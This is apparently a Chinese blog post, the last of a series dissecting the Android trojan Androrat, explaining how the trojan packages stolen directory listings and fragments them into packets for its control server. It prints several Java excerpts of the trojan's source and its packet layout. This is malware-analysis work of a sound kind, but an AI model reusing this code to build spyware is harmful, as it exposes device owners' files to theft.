@@ -1,0 +1,143 @@
+---
+layout: post
+title: "剖析安卓木马Androrat（终）"
+date: 2017-04-09 02:06:34 +0800
+author: tang3
+comments: true
+categories: 技术
+---
+
+## 0x00 前言
+
+前面的两篇文章已经将Androrat的主要功能和处理方式分析的差不多了，这篇文章来做一些收尾的工作，将之前没有说的命令执行结果发送至服务端的数据封装过程分析一下，以及这个应用的执行结构图。
+
+## 0x01 返回数据封装分析
+
+以列出目录树这个功能为例，ProcessCommand这部分功能的代码如下：
+
+```java
+} else if (commande == Protocol.LIST_DIR)
+		{
+			client.sendInformation("List directory request received");
+			String file = new String(arguments.array());
+			if (!DirLister.listDir(client, chan, file))
+				client.sendError("Directory: "+file+" not found");
+			
+		} else if (commande == Protocol.GET_FILE)
+```
+
+调用DirLister.listDir这个方法来实现列目录功能，参数为当前环境的Client对象，解析数据后的channel和执行命令所需的参数（这里是“/”）。下面我们来看listDir的代码:
+
+```java
+	public static boolean listDir(ClientListener c, int channel, String dirname) {
+		File f;
+		ArrayList<MyFile> ar = new ArrayList<MyFile>();
+		
+		if(dirname.equals("/"))
+			f = Environment.getExternalStorageDirectory();
+		else
+			f = new File(dirname);
+		
+		if (!f.exists()) {
+			return false;
+		} 
+		else {
+			ar.add(visitAllDirsAndFiles(f));
+			c.handleData(channel, new FileTreePacket(ar).build());
+			return true;
+		}
+	}
+```
+
+大都是执行功能的代码，就不多说了。我们直接来看倒数第二行，将执行结果先通过FileTreePacket的build进行转换，转换为Byte数组的形式，然后通过Client的handleData方法实现封装和传输。handleData中只有一行调用Connection的sendData方法，这个方法也是一行，调用了Mux的send方法。我们直接来看Mux的send的代码：
+
+```java
+public void send(int chan,byte[] data)
+	{
+		try
+		{
+			TransportPacket tp;
+			boolean last = false;
+			boolean envoieTotal = false;
+			int pointeurData = 0;
+			short numSeq = 0;
+			int actualLenght;
+
+			while (!envoieTotal) 
+			{
+				byte[] dataToSend;
+
+				
+				if (last || ((Protocol.HEADER_LENGTH_DATA + data.length) < Protocol.MAX_PACKET_SIZE))
+				{
+					dataToSend = new byte[Protocol.HEADER_LENGTH_DATA + (data.length - pointeurData)];
+					last = true ;
+					envoieTotal = true ;
+				}
+				else
+					dataToSend = new byte[Protocol.MAX_PACKET_SIZE];
+				
+				
+				actualLenght = dataToSend.length - Protocol.HEADER_LENGTH_DATA;
+
+
+				byte[] fragData = new byte[dataToSend.length-Protocol.HEADER_LENGTH_DATA];
+				System.arraycopy(data, pointeurData, fragData, 0, fragData.length);
+				tp = new TransportPacket(data.length, actualLenght, chan, last, numSeq, fragData);
+				dataToSend = tp.build();
+				
+				pointeurData = pointeurData + actualLenght;
+				numSeq++;
+				if ((data.length - pointeurData) <= (Protocol.MAX_PACKET_SIZE - Protocol.HEADER_LENGTH_DATA))
+				{
+					last = true;
+				}
+				
+				sender.send(dataToSend);
+
+			}
+		}
+		catch(NullPointerException e)
+		{
+			System.out.println("Ce channel n'est pas index");
+			e.printStackTrace();
+		}
+	}
+}
+```
+
+和上一篇文章讲解码的过程差不多，先判断数据+头部的大小是否超过包的最大值（2048）。如果未超过则构造数据+头部大小的byte数组，last位（参见上一篇文章的服务端发送指令格式）置为true，actualLenght值为发送大小减头部长度。创建fragData数组大小为本次传输的数据大小，将本次传输的内容从存储源数据的data移动到fragData中，然后实例化TransportPacket对象，使用它的build方法来生成传输信息。
+
+若数据+头部的大小超过包的最大值，则last置false，其他操作不变，循环发送直至数据发送完毕。
+
+最后我们可以得到返回数据的结构如下：
+
+![hexdump](/assets/images/2017-04/hexdump.png)
+
+切割后内容与服务端发送指令格式一样
+
+```
+totalLength  :00 00 00 28  ==》总共长度，如果分片传递则大于localLength 
+localLength  :00 00 00 28  ==》本包长度 
+lst          :01           ==》是否为最后一个包 
+NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包 
+channel      :00 00 00 01  ==》服务端所使用的频道 
+Data         : …………        ==》数据部分
+```
+
+## 0x02 程序结构
+
+按理说程序结构图这部分应该放在第一篇文章中的，不过由于那时对这个程序还没有了解透彻，所以就拖到了最后这篇收尾文章中。如果这我的三篇文章都仔细看过，下面这张图就很好理解，废话不多说直接看图吧：
+
+![structure](/assets/images/2017-04/structure.png)
+
+
+## 0x03 总结
+
+在分析这个程序的期间，还穿插了对一个恶意apk样本（Xiangce）的分析，对比这两个apk发现Android木马可以针对服务端的响应分为主动式和被动式。
+
+> 被动式：服务端只负责接收客户端返回信息，所需要的功能都在apk生成时确   定，生成后不再可以修改。
+
+> 主动式：服务端主动发送操控命令，客户端响应命令回传数据，也向客户端发送转换为被动式的命令，例如，当收到短信时向服务端发送此条信息。
+
+两种分类中，主动式由于功能大而全，所以需要申请过多的权限，容易在安装时被察觉。被动式功能固定伪装性好，不过灵活性相对较差。Xiangce这个恶意样本是一个偏被动式的恶意样本，功能固定在短信和电话接听这两个主要的方面，之所以说是偏被动，是因为在其功能中有一些需要通过短信发送的方式进行操控的地方。
